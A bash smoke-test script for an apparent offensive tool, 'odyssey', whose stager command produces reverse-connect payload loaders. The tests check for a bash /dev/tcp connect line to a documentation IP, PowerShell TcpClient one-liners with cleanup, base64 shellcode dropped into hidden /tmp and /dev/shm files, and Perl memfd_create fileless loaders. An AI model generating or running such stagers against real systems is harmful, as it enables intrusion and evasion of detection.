#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
ODYSSEY="${ODYSSEY:-$ROOT_DIR/bin/odyssey}"

TOTAL=17
N=0

N=$((N+1)); echo "[S2] test $N/$TOTAL: format list"

OUT=$("$ODYSSEY" stager --format list 2>/dev/null)
if ! echo "$OUT" | grep -q "oneliner"; then
    echo "FAIL: list missing oneliner" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "stub-memfd"; then
    echo "FAIL: list missing stub-memfd" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "perl-memfd"; then
    echo "FAIL: list missing perl-memfd" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: format list --os linux"

OUT=$("$ODYSSEY" stager --format list --os linux 2>/dev/null)
if echo "$OUT" | grep -q "windows"; then
    echo "FAIL: os filter not working" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: oneliner linux"

OUT=$("$ODYSSEY" stager --connect 203.0.113.10:4444 --os linux --format oneliner --run-args "--version")
if ! echo "$OUT" | grep -q "exec 3<>/dev/tcp/203.0.113.10/4444"; then
    echo "FAIL: missing /dev/tcp connect" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "\-\-version"; then
    echo "FAIL: missing --version in args" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: oneliner windows"

OUT=$("$ODYSSEY" stager --connect 198.51.100.5:8443 --os windows --format oneliner --run-args "reverse-client --connect 198.51.100.5:9001")
if ! echo "$OUT" | grep -q "Net.Sockets.TcpClient"; then
    echo "FAIL: missing TcpClient" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "198.51.100.5"; then
    echo "FAIL: missing IP" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: base64 mini-stager linux"

OUT=$("$ODYSSEY" stager --connect 203.0.113.10:5555 --os linux --format base64 --token "smoke-test-token-2026" 2>/dev/null)
FIRST_LINE=$(echo "$OUT" | head -1 || true)
LAST_LINE=$(echo "$OUT" | tail -1 || true)
LINE_COUNT=$(echo "$OUT" | wc -l || true)
if [ "$LINE_COUNT" -lt 5 ] || [ "$LINE_COUNT" -gt 20 ]; then
    echo "FAIL: expected 5-20 chunked lines, got $LINE_COUNT" >&2; exit 1
fi
if ! echo "$FIRST_LINE" | grep -q "^echo -n "; then
    echo "FAIL: first line should start with echo -n" >&2; exit 1
fi
if ! echo "$LAST_LINE" | grep -q "base64 -d /tmp/\.b>/tmp/\.s"; then
    echo "FAIL: last line should decode and execute" >&2; exit 1
fi
MAX_LEN=0
while IFS= read -r line; do
    len=${#line}
    if [ "$len" -gt "$MAX_LEN" ]; then MAX_LEN=$len; fi
done <<< "$OUT"
if [ "$MAX_LEN" -gt 1650 ]; then
    echo "FAIL: longest line is $MAX_LEN chars, exceeds chunk limit" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: stub (disk)"

OUT=$("$ODYSSEY" stager --connect 203.0.113.10:4444 --os linux --format stub 2>/dev/null)
LEN=${#OUT}
if [ "$LEN" -lt 1100 ] || [ "$LEN" -gt 1400 ]; then
    echo "FAIL: stub output unexpected length $LEN (expected 1100-1400)" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "^echo -n '"; then
    echo "FAIL: stub should start with echo -n" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "/tmp/\.s"; then
    echo "FAIL: stub should write to /tmp/.s" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: stub-memfd (perl)"

OUT=$("$ODYSSEY" stager --connect 203.0.113.10:4444 --os linux --format stub-memfd 2>/dev/null)
if ! echo "$OUT" | grep -q "^perl -e "; then
    echo "FAIL: stub-memfd should start with perl" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "MIME::Base64"; then
    echo "FAIL: stub-memfd should use MIME::Base64" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "syscall(319"; then
    echo "FAIL: stub-memfd should call memfd_create" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: perl-memfd (no stub)"

OUT=$("$ODYSSEY" stager --connect 203.0.113.10:4444 --os linux --format perl-memfd 2>/dev/null)
LEN=${#OUT}
if [ "$LEN" -gt 300 ]; then
    echo "FAIL: perl-memfd too long ($LEN chars)" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "^perl -e "; then
    echo "FAIL: perl-memfd should start with perl" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "IO::Socket::INET"; then
    echo "FAIL: perl-memfd should use IO::Socket" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "203.0.113.10"; then
    echo "FAIL: perl-memfd should contain target IP" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "syscall(319"; then
    echo "FAIL: perl-memfd should call memfd_create" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: stub disk --run-args"

OUT=$("$ODYSSEY" stager --connect 203.0.113.10:4444 --os linux --format stub --run-args "relay --listen 0.0.0.0:8080 --to 198.51.100.2:80" 2>/dev/null)
if ! echo "$OUT" | grep -q "^echo -n '"; then
    echo "FAIL: stub+args should use shellcode (echo -n base64)" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "/tmp/\.s"; then
    echo "FAIL: stub+args should write to /tmp/.s" >&2; exit 1
fi
OUT_NOARGS=$("$ODYSSEY" stager --connect 203.0.113.10:4444 --os linux --format stub 2>/dev/null)
if [ "$OUT" = "$OUT_NOARGS" ]; then
    echo "FAIL: stub+args base64 should differ from no-args (patched PATCH_ARGS)" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: stub-shm --run-args"

OUT=$("$ODYSSEY" stager --connect 203.0.113.10:4444 --os linux --format stub-shm --run-args "--version" 2>/dev/null)
if ! echo "$OUT" | grep -q "^echo -n '"; then
    echo "FAIL: stub-shm+args should use shellcode (echo -n base64)" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "/dev/shm/\.s"; then
    echo "FAIL: stub-shm+args should write to /dev/shm/.s" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: stub-memfd --run-args"

OUT=$("$ODYSSEY" stager --connect 203.0.113.10:4444 --os linux --format stub-memfd --run-args "relay --listen 0.0.0.0:8080" 2>/dev/null)
if ! echo "$OUT" | grep -q "^perl -e "; then
    echo "FAIL: stub-memfd+args should use perl" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "MIME::Base64"; then
    echo "FAIL: stub-memfd+args should use MIME::Base64 (shellcode in memfd)" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: perl-memfd --run-args"

OUT=$("$ODYSSEY" stager --connect 203.0.113.10:4444 --os linux --format perl-memfd --run-args "--version" 2>/dev/null)
if ! echo "$OUT" | grep -q "^perl -e "; then
    echo "FAIL: perl-memfd+args should use perl" >&2; exit 1
fi
if ! echo "$OUT" | grep -q "\-\-version"; then
    echo "FAIL: perl-memfd+args should contain --version" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: base64 --run-args"

OUT=$("$ODYSSEY" stager --connect 203.0.113.10:5555 --os linux --format base64 --token "smoke-test-token-2026" --run-args "relay --listen 0.0.0.0:8080" 2>/dev/null)
LAST_LINE=$(echo "$OUT" | tail -1 || true)
if ! echo "$LAST_LINE" | grep -q "relay --listen"; then
    echo "FAIL: base64+args last line should contain run-args" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: stub --os windows rejected"

if "$ODYSSEY" stager --connect 203.0.113.10:4444 --os windows --format stub 2>/dev/null; then
    echo "FAIL: stub+windows should fail" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: windows oneliner has cleanup"

OUT=$("$ODYSSEY" stager --connect 203.0.113.10:4444 --os windows --format oneliner 2>/dev/null)
if ! echo "$OUT" | grep -q "Remove-Item"; then
    echo "FAIL: windows oneliner missing Remove-Item" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: base64 --os windows rejected"

if "$ODYSSEY" stager --connect 203.0.113.10:5555 --os windows --format base64 --token "t" 2>/dev/null; then
    echo "FAIL: base64+windows should fail" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

N=$((N+1)); echo "[S2] test $N/$TOTAL: stager-server --no-auth --token mutually exclusive"

if "$ODYSSEY" stager-server --listen 127.0.0.1:19199 --binary "$ODYSSEY" --no-auth --token "x" 2>/dev/null; then
    echo "FAIL: --no-auth --token should fail" >&2; exit 1
fi
echo "[S2] ok $N/$TOTAL"

echo "S2_SMOKE_OK"
